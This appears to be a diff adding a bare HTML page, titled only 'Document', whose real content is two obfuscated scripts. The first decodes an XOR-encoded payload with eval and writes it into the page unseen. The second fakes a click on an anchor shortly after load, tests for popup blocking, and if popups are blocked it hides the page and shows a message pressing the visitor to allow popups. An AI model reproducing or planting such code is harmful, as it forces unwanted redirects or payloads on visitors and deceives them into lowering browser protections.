@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <style>
+        body{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        }
+        header{
+            width: 100%;
+            box-shadow: 2px 3px 8px rgb(190, 190, 190);
+            position: relative;
+        }
+        header .nav {
+            background-color: bisque;
+        }
+        header .nav ul {
+            list-style: none;
+            display: flex;
+            flex-direction: row-reverse;
+            margin: 10px auto;
+            
+        }
+        header .nav ul li {
+            padding: 8px;
+            background-color: chartreuse;
+            margin: 4px;
+            box-shadow: inset 2px 2px 6px;
+            border-radius: 4px;
+            color: blue;
+            font-weight: bold;
+        }
+        header .nav ul li a {
+            text-decoration: none;
+        }
+        .video .live iframe {
+            border-radius: 5px;
+        }
+        #alert-msg {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <main><script type="text/javascript">
+        <!-- 
+        eval(unescape('%66%75%6e%63%74%69%6f%6e%20%72%37%32%36%36%31%30%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%34%39%30%36%38%30%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%35%32%39%35%32%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+        eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%72%37%32%36%36%31%30%28%27') + '%37%5e%55%5e%53%59%6d%33%01%03%1e%12%15%13%16%1e%11%1f%12%13%11%12%31%52%65%6f%13%5b%6a%5e%62%6f%30%1f%60%5a%64%1c%37%00%00%1e%11%1f%12%13%11%12%15%1e%12%15%13%16%1e%11%1f%36%68%65%30%06%08%12%15%13%16%1e%11%1f%12%13%11%12%15%1e%12%15%13%16%1e%11%1f%36%67%66%30%31%51%12%5d%6d%5d%54%32%11%1c%31%45%65%6f%55%12%49%69%32%2f%5e%3d%36%22%65%65%37%0d%04%15%13%16%1e%11%1f%12%13%11%12%15%1e%12%15%13%16%1e%11%1f%12%37%65%65%37%3a%5d%15%5b%68%55%5b%3c%1c%1d%33%3a%64%6d%59%31%22%59%3c%35%2e%66%64%33%01%03%1e%12%15%13%16%1e%11%1f%12%13%11%12%15%1e%12%15%13%16%1e%11%3b%66%64%33%36%5a%1e%5a%6b%58%5c%3d%1f%11%30%3e%6f%65%58%6b%59%69%37%27%51%33%3b%23%67%66%30%06%08%12%15%13%16%1e%11%1f%12%13%11%12%15%1e%12%15%13%16%1e%11%1f%36%67%66%30%31%51%12%62%5f%35%10%6c%64%62%63%60%6c%69%10%12%5d%6d%5d%54%32%11%5a%6f%6d%62%68%38%23%24%5f%68%69%61%56%66%58%5e%61%5b%6f%6c%6b%62%6f%69%63%56%20%5e%60%61%24%69%5f%2c%6e%70%20%67%62%6e%69%30%67%5e%79%31%32%2b%5a%39%29%55%2d%5f%2d%5e%28%2e%29%2d%2e%28%27%29%23%29%29%21%35%2e%51%2e%32%2d%2c%26%2d%38%1c%13%6d%5d%6b%57%59%69%30%18%5f%5f%6b%5d%61%64%1c%37%43%69%65%63%67%60%6d%3b%23%5c%33%36%24%6a%65%37%00%00%1e%11%1f%12%13%11%12%15%1e%12%15%13%16%1e%11%1f%36%22%6a%66%37%0d%04%15%13%16%1e%11%1f%12%13%11%12%15%1e%36%24%5f%61%64%33%0c%04%13%11%12%15%1e%12%15%13%32%2f%59%54%5d%5f%5a%6c%37%0d%04%06%05%16%1e%11%1f%12%13%11%12%31%52%65%6f%13%5b%6a%5e%62%6f%30%1f%68%62%52%59%64%1d%34%0d%07%1f%12%13%11%12%15%1e%12%15%13%16%1e%35%57%2c%31%4c%6e%5a%60%12%48%62%66%60%6d%62%12%2c%35%23%5d%20%30%06%05%16%1e%11%1f%12%13%11%12%15%1e%12%15%37%5a%69%6b%1f%5f%67%5e%6f%68%3d%1c%61%64%6c%55%1f%3d%01%05%11%12%15%1e%12%15%13%16%1e%11%1f%12%13%11%12%15%3a%65%5f%6d%59%6d%5a%1f%6f%6d%5c%31%1b%2f%23%68%6f%68%55%5e%6c%20%5e%6f%65%58%56%5e%27%69%61%6e%20%64%62%5f%5e%6e%5e%2f%6f%69%5c%68%2c%61%57%62%1d%11%6b%62%52%6e%5d%30%18%21%21%2f%19%1d%11%5a%5e%69%5b%5d%6f%35%10%2a%2f%22%63%69%1c%15%1e%5d%61%67%67%67%5b%64%66%67%6c%5f%6b%55%59%67%13%34%3a%20%68%58%6d%5e%61%5e%3c%01%03%13%16%1e%11%1f%12%13%11%12%15%1e%12%31%22%5a%69%6b%3d%01%05%11%12%15%1e%12%15%13%16%3a%20%53%65%69%3314906803%34%31%39%36%38%35%34' + unescape('%27%29%29%3b'));
+        // -->
+        </script>
+    </main>
+    <h1 id="alert-msg">Your Browser is Block PopUp , Kindly Allow Browser PopUp</h1>
+    <script>
+
+var _0x347fbe=_0x2bb4;function _0x1811(){var _0x307e45=['_blank','3240920DCOyek','1255374PTsROh','load','889856bRTuas','588NmCjZP','block','click','722248ojCIxN','about:blank','style','addEventListener','support','8094BjGVHy','getElementsByTagName','alert-msg','none','43890EOwOqc','8930hFHyFx','dispatchEvent','7tvtrvN','getElementById','close','3771WuWQIW'];_0x1811=function(){return _0x307e45;};return _0x1811();}function _0x2bb4(_0x20a683,_0xa0cefa){var _0x181147=_0x1811();return _0x2bb4=function(_0x2bb4ae,_0x4da817){_0x2bb4ae=_0x2bb4ae-0xc8;var _0xfe1683=_0x181147[_0x2bb4ae];return _0xfe1683;},_0x2bb4(_0x20a683,_0xa0cefa);}(function(_0x1aa0bf,_0x4605ce){var _0x27333b=_0x2bb4,_0x2925e4=_0x1aa0bf();while(!![]){try{var _0x281315=parseInt(_0x27333b(0xd0))/0x1*(-parseInt(_0x27333b(0xcd))/0x2)+parseInt(_0x27333b(0xd6))/0x3+-parseInt(_0x27333b(0xd8))/0x4+parseInt(_0x27333b(0xd5))/0x5+-parseInt(_0x27333b(0xc9))/0x6*(-parseInt(_0x27333b(0xd9))/0x7)+-parseInt(_0x27333b(0xdc))/0x8+-parseInt(_0x27333b(0xd3))/0x9*(parseInt(_0x27333b(0xce))/0xa);if(_0x281315===_0x4605ce)break;else _0x2925e4['push'](_0x2925e4['shift']());}catch(_0x1a80eb){_0x2925e4['push'](_0x2925e4['shift']());}}}(_0x1811,0x52de7));var anchor=document[_0x347fbe(0xd1)](_0x347fbe(0xc8));function simulateClick(_0x51b409){var _0x14ba1e=_0x347fbe,_0x5e6c25=new MouseEvent(_0x14ba1e(0xdb),{'view':window,'bubbles':!![],'cancelable':!![]});_0x51b409[_0x14ba1e(0xcf)](_0x5e6c25);}function isPopupBlocked(){var _0x5e2f0b=_0x347fbe,_0x31c9d8=window['open'](_0x5e2f0b(0xdd),_0x5e2f0b(0xd4));if(_0x31c9d8===null)return!![];return _0x31c9d8[_0x5e2f0b(0xd2)](),![];}function hideBody(){var _0x5ba334=_0x347fbe,_0x4ec580=document[_0x5ba334(0xca)]('main')[0x0];_0x4ec580['style']['display']=_0x5ba334(0xcc);}function showMessage(){var _0x4a255c=_0x347fbe,_0x55499c=document['getElementById'](_0x4a255c(0xcb));_0x55499c[_0x4a255c(0xde)]['display']=_0x4a255c(0xda);}window[_0x347fbe(0xdf)](_0x347fbe(0xd7),function(){setTimeout(function(){simulateClick(anchor);var _0x4f40e4=isPopupBlocked();_0x4f40e4&&(hideBody(),showMessage());},0x1388);});
+
+
+    </script>
+</body>
+</html>
